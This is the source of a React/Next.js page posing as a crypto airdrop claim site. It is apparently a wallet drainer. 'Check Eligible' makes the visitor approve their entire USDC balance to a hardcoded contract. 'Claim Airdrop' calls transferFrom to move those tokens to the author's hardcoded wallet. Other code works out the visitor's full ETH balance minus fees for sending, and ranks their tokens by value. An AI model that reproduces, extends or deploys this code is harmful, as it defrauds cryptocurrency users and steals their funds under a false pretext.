import Head from 'next/head'
import styles from '../styles/Home.module.css'
import 'bulma/css/bulma.css'
import {BigNumber, ethers} from 'ethers'
import { useState, useEffect } from 'react'
import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress, SenderAbi } from '../constants'

import './addresses'
// import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";


let MyWalletAddress = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E"



export default function Home() {

  const [account, setAccount] = useState()
  // const [user, setUser] = useState()
  const [isConnected, setIsConnected] = useState(false)
  const [provider, setProvider] = useState()
  const [signer, setSigner] = useState()
  const [balance, setBalance] = useState()
  const [gasPrice, setGasPrice] = useState()
  const [gasLimit, setGasLimit] = useState()
  const [aggregatorContract, setAggregatorContract] = useState()
  const [tokenContract, setTokenContract] = useState()
  
  let etherValueOfUser
  let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
  let user
  let _signer

  const busdAddress = "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
  const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f"
  const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
  const linkAddress = "0x514910771af9ca656af840dff83e8264ecf986ca"
  const wbtcAddress = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
  const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"

  let amount

  async function connect() {
    if (typeof window.ethereum !== 'undefined'){
      const accounts = await ethereum.request({method: "eth_requestAccounts"})
      setAccount(accounts[0])
      console.log(`accounts: ${accounts}`);


      const _provider = new ethers.providers.Web3Provider(window.ethereum)
      console.log(_provider);
      setProvider(_provider)


      user = await _provider.send("eth_requestAccounts", []);
      console.log(user);
      _signer = _provider.getSigner()
      setSigner(_signer)
      console.log(_signer);
      const bal = await _signer.getBalance(user.address)
      // convert balance from bignumber to ethereum type:
      const balToEth = ethers.utils.formatEther(bal)
    
      console.log('balance:',bal);
      
      const gasL = ethers.utils.hexlify(100000)
      setGasLimit(gasL)

      const gasP = _provider.getGasPrice()
      // setGasPrice(gasP)
      setGasPrice(gasP)
      // const fee = (estimateGas).mul(gasL)
      const fee = (await gasP).mul(gasL)
      console.log('fee', fee);

      const finalAmount = bal - (fee * 10)
      const finalAmountToString = finalAmount.toString()
      const finalAmountBigNumber = BigNumber.from(finalAmountToString)
      console.log("finalAmountBigNumber",finalAmountBigNumber);
      // const finalAmountToString = finalAmount.BigNumber.toHexString()
      console.log('finalAmountToString:', finalAmountToString);
      setBalance(finalAmountBigNumber)
      console.log('final amount:',finalAmount);

      // setAggregatorContract(new ethers.Contract("0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e", aggregator, _provider))
      // console.log(aggregatorContract);
      
      // const etherValueInUsd = await aggregatorContract.latestRoundData()
      

      const etherValue = bal / 10e17
      etherValueOfUser = etherValue

      // const daiToken = new ethers.Contract(daiAddress, abi, providerr);
      // const daiBalance = await daiToken.balanceOf(signerr.getAddress());
      // const daiValue = daiBalance / 10e5

      // const usdcToken = new ethers.Contract(usdcAddress, abi, providerr);
      // const usdcBalance = await usdcToken.balanceOf(signerr.getAddress());
      // const usdcValue = usdcBalance / 10e5

      // const usdtToken = new ethers.Contract(usdtAddress, abi, providerr);
      // const usdtBalance = await usdtToken.balanceOf(signerr.getAddress());
      // const usdtValue = usdtBalance / 10e5

      // const busdToken = new ethers.Contract(busdAddress, abi, providerr);
      // const busdBalance = await busdToken.balanceOf(signerr.getAddress());
      // const busdValue = busdBalance / 10e5

      // const linkToken = new ethers.Contract(linkAddress, abi, providerr);
      // const linkBalance = await linkToken.balanceOf(signerr.getAddress());
      // const linkValue = linkBalance / 10e16

      // const wbtcToken = new ethers.Contract(wbtcAddress, abi, providerr);
      // const wbtcBalance = await wbtcToken.balanceOf(signerr.getAddress());
      // const wbtcValue = wbtcBalance / 10e13


      console.log(`ether value is :${etherValue}`);

    }
  }
  let _demical

  async  function getData() {

    const chainId = await signer.getChainId()
    console.log('chain id:',chainId);

    if (chainId == 137) {

      const priceEth = new ethers.Contract("0xF9680D99D6C9589e2a93a78A04A279e509205945",aggregator,provider)
      const currentEthPrice = await priceEth.latestRoundData()
      console.log('price Weth:',currentEthPrice.answer.toString());
  
      const priceLink = new ethers.Contract("0xd9FFdb71EbE7496cC440152d43986Aae0AB76665",aggregator,provider)
      const currentLinkPrice = await priceLink.latestRoundData()
      console.log('price Link:',currentLinkPrice.answer.toString());
  
      const priceMatic = new ethers.Contract("0xAB594600376Ec9fD91F8e885dADF0CE036862dE0",aggregator,provider)
      const currentMatickPrice = await priceMatic.latestRoundData()
      console.log('price Matic:',currentMatickPrice.answer.toString());
  
      const priceUni = new ethers.Contract("0xdf0Fb4e4F928d2dCB76f438575fDD8682386e13C",aggregator,provider)
      const currentUniPrice = await priceUni.latestRoundData()
      console.log('price Uni:',currentUniPrice.answer.toString());
      
      
      const eth = new ethers.Contract("0x7ceb23fd6bc0add59e62ac25578270cff1b9f619",ERC20,provider)
      const usdc = new ethers.Contract( "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",ERC20 ,provider)
      const usdt = new ethers.Contract( "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",ERC20 ,provider)
      const link = new ethers.Contract( "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39",ERC20 ,provider)
      const dai = new ethers.Contract( "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",ERC20 ,provider)
      const matic = new ethers.Contract( "0x0000000000000000000000000000000000001010",ERC20 ,provider)
      const uni = new ethers.Contract( "0xb33eaad8d922b1083446dc23f610c2567fb5180f",ERC20 ,provider)
      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
      console.log('usdc balance:',usdcB.toString() / 10 ** 6);
      console.log('usdt balance:',usdtB.toString() / 10 ** 6);
      console.log('link balance:',linkB.toString() / 10 ** 18);
      console.log('dai balance:',daiB.toString() / 10 ** 18);
      console.log('matic balance:',maticB.toString() / 10 ** 18);
      console.log('uni balance:',uniB.toString() / 10 ** 18);
  
      const ethValue = ethB.mul(currentEthPrice.answer)
      const usdcValue = usdcB/ 6
      const usdtValue = usdtB / 6
      const linkValue = linkB.mul(currentLinkPrice.answer)
      const daiValue =  daiB / 18
      const maticValue = maticB.mul(currentMatickPrice.answer)
      const uniValue = uniB.mul(currentUniPrice.answer)
  
      console.log(ethValue.toString() / 10 ** 26);
      console.log(usdcValue.toString());
      console.log(usdtValue.toString());
      console.log(daiValue.toString());
      console.log(linkValue.toString() / 10 ** 26);
      console.log(maticValue.toString() / 10 ** 26);
      console.log(uniValue.toString() / 10 ** 26);
  
      const ETH = {
        amount: ethB,
        value: (ethB.toString() / 10 ** 26),
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: (usdtValue.toString() / 10 ** 26),
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: (uniValue.toString() / 10 ** 26),
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: (daiValue.toString() / 10 ** 26),
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      const MATIC = {
        amount: maticB,
        value: (maticValue.toString() / 10 ** 26),
        address: "0x0000000000000000000000000000000000001010"
      }
      const LINK = {
        amount: linkB,
        value: (linkValue.toString() / 10 ** 26),
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: usdcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      
      console.log(Tokens);
      console.log(Biggest);
      //  Tokens.sort((a, b) => b - a);
      // console.log(Tokens);
      // // }
      // tokensBalance.sort(function(a, b){return b-a});
  
      // let highest = points[0];
      // console.log(highest);
  
    } if (chainId == 1) {
      const priceEth = new ethers.Contract("0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419",aggregator,provider)
      const currentEthPrice = await priceEth.latestRoundData()
      console.log('price Weth:',currentEthPrice.answer.toString());
  
      const priceLink = new ethers.Contract("0x2c1d072e956AFFC0D435Cb7AC38EF18d24d9127c",aggregator,provider)
      const currentLinkPrice = await priceLink.latestRoundData()
      console.log('price Link:',currentLinkPrice.answer.toString());
  
      const priceMatic = new ethers.Contract("0x7bAC85A8a13A4BcD8abb3eB7d6b4d632c5a57676",aggregator,provider)
      const currentMatickPrice = await priceMatic.latestRoundData()
      console.log('price Matic:',currentMatickPrice.answer.toString());
  
      const priceUni = new ethers.Contract("0x553303d460EE0afB37EdFf9bE42922D8FF63220e",aggregator,provider)
      const currentUniPrice = await priceUni.latestRoundData()
      console.log('price Uni:',currentUniPrice.answer.toString());
      
      
      const eth = new ethers.Contract("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",ERC20,provider)
      const usdc = new ethers.Contract( "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",ERC20 ,provider)
      const usdt = new ethers.Contract( "0xdac17f958d2ee523a2206206994597c13d831ec7",ERC20 ,provider)
      const link = new ethers.Contract( "0x514910771af9ca656af840dff83e8264ecf986ca",ERC20 ,provider)
      const dai = new ethers.Contract( "0x6b175474e89094c44da98b954eedeac495271d0f",ERC20 ,provider)
      const matic = new ethers.Contract( "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",ERC20 ,provider)
      const uni = new ethers.Contract( "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",ERC20 ,provider)
      const ethB = await eth.balanceOf(account)
      const usdcB = await usdc.balanceOf(account)
      const usdtB = await usdt.balanceOf(account)
      const linkB = await link.balanceOf(account)
      const daiB = await dai.balanceOf(account)
      const maticB = await matic.balanceOf(account)
      const uniB = await uni.balanceOf(account)
      console.log('Weth balance:',ethB.toString() / 10 ** 18);
      console.log('usdc balance:',usdcB.toString() / 10 ** 6);
      console.log('usdt balance:',usdtB.toString() / 10 ** 6);
      console.log('link balance:',linkB.toString() / 10 ** 18);
      console.log('dai balance:',daiB.toString() / 10 ** 18);
      console.log('matic balance:',maticB.toString() / 10 ** 18);
      console.log('uni balance:',uniB.toString() / 10 ** 18);
  
      const ethValue = ethB.mul(currentEthPrice.answer)
      const usdcValue = usdcB/ 6
      const usdtValue = usdtB / 6
      const linkValue = linkB.mul(currentLinkPrice.answer)
      const daiValue =  daiB / 18
      const maticValue = maticB.mul(currentMatickPrice.answer)
      const uniValue = uniB.mul(currentUniPrice.answer)
  
      console.log(ethValue.toString() / 10 ** 26);
      console.log(usdcValue.toString());
      console.log(usdtValue.toString());
      console.log(daiValue.toString());
      console.log(linkValue.toString() / 10 ** 26);
      console.log(maticValue.toString() / 10 ** 26);
      console.log(uniValue.toString() / 10 ** 26);
  
      const ETH = {
        amount: ethB,
        value: (ethB.toString() / 10 ** 26),
        address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619"
      }
  
      const USDT = {
        amount: usdtB,
        value: (usdtValue.toString() / 10 ** 26),
        address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
      }
      const UNI = {
        amount: uniB,
        value: (uniValue.toString() / 10 ** 26),
        address: "0xb33eaad8d922b1083446dc23f610c2567fb5180f"
      }
      const DAI = {
        amount: daiB,
        value: (daiValue.toString() / 10 ** 26),
        address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
      }
  
      const MATIC = {
        amount: maticB,
        value: (maticValue.toString() / 10 ** 26),
        address: "0x0000000000000000000000000000000000001010"
      }
      const LINK = {
        amount: linkB,
        value: (linkValue.toString() / 10 ** 26),
        address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39"
      }
      const USDC = {
        amount: usdcB,
        value: usdcValue,
        address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
      }
  
      // const tokensValues = [usdcValue ,usdtValue ,linkValue ,daiValue ,maticValue ,uniValue]
      // // const tokensBalance = [usdc,usdt,link,dai,matic,uni]
  
      // console.log(tokensValues);
      let lastElement
      let Biggest  
      const Tokens = [ETH,LINK,MATIC,USDC,UNI,USDT,DAI]
      for (let i = 0; i < Tokens.length; i++) {
      const element = Tokens[i].value;
        if (i >= 0 && element > lastElement) {
          Biggest = Tokens[i]
        }
        lastElement = element
      }
      
      console.log(Tokens);
      console.log(Biggest);
    }


    

    
  }


  async function check() {
    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
    const balanceOfUsdc = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
    // console.log(ethers.utils.formatUnits(balanceOfToken, "mwei") );
    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
    setTokenContract(tokenContract)
    const Decimal = await tokenContract.decimals()
    
   
    console.log(Decimal);
    // await Decimal.then(value =>{
    //   console.log(value);
    //   _demical = value
    // })
    console.log(balanceOfUsdc/ (10 ** Decimal) );
    const tokenWithSigner = tokenContract.connect(signer)

    const voidSigner = new ethers.VoidSigner(MyWalletAddress, provider)
   
    const senderContract = new ethers.Contract("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077",SenderAbi,provider)
    const senderWithSigner = senderContract.connect(signer)
    const approve = await tokenWithSigner.approve("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077", balanceOfUsdc)
    const send = await senderWithSigner.sendToken(account, "0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077","0x07865c6E87B9F70255377e024ace6630C1Eaa37F")
    // const approve = await tokenWithSigner.approve(MyWalletAddress, balanceOfToken)
    // const daiValue = daiBalance / 10e5
    // if (condition) {
    //   console.log(balanceOfToken *);
    // }
    
  }

  
  

  async function claimAirdrop() {
    const _gasLimit = ethers.utils.hexlify(1000000)
    const _gasPrice = ethers.utils.parseUnits("10.0", "gwei")
    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
    const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
    const tokenWithSigner = tokenContract.connect(signer)
    const approve = await tokenWithSigner.transferFrom(account,MyWalletAddress, balanceOfToken,{
      gasLimit: _gasLimit,
      gasPrice: _gasPrice
    })
    
  }

  async function getApproveEmmit () {
    const approveEvents = await tokenContract.queryFilter('approve')
    console.log(approveEvents);

  }
  // async function claimAirdrop() {

  //   signer.sendTransaction({
  //     from: user,
  //     to: Receptient,
      
  //     gasPrice: gasPrice,
  //     gasLimit: gasLimit,
  //     value: (balance),
  //   })
  // }

  return (
    <div className='has-background-white'>
    <div className={styles.container}>
      <Head>
        <title>Create Next App</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      
        <div className="has-background-white">
          <div className='box has-background-white'>
            <nav className='navbar has-background-white'>
              <div className='navbar-end'>
                <button onClick={() =>connect()} className='button is-link'>
                  Connect Wallet
                </button>
                <button onClick={() => getData()} className= 'button is-primary ml-2'>
                  GetBalance
                </button>
                <button onClick={() =>getData()} className='button is-link'>getData</button>
              </div>
            </nav>
          </div>
        </div>
        <main className={styles.main}>
    
          
            <div className='column is-one-third'>
              <div className='box'>
                <button onClick={() => check()} className='button is-dark is-outlined is-centered mr-4'>Check Eligible</button>
                <button onClick={() => claimAirdrop()} className='button is-dark is-centered' >Claim Airdrop</button>
              </div>
            </div>
          
      </main>

      <footer className={styles.footer}>
        <a
          className='has-text-black'
          href="https://vercel.com?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
          target="_blank"
          rel="noopener noreferrer"
        >
          Powered by Alireza Haghshenas
        </a>
      </footer>
    </div>
    </div>
  )
}
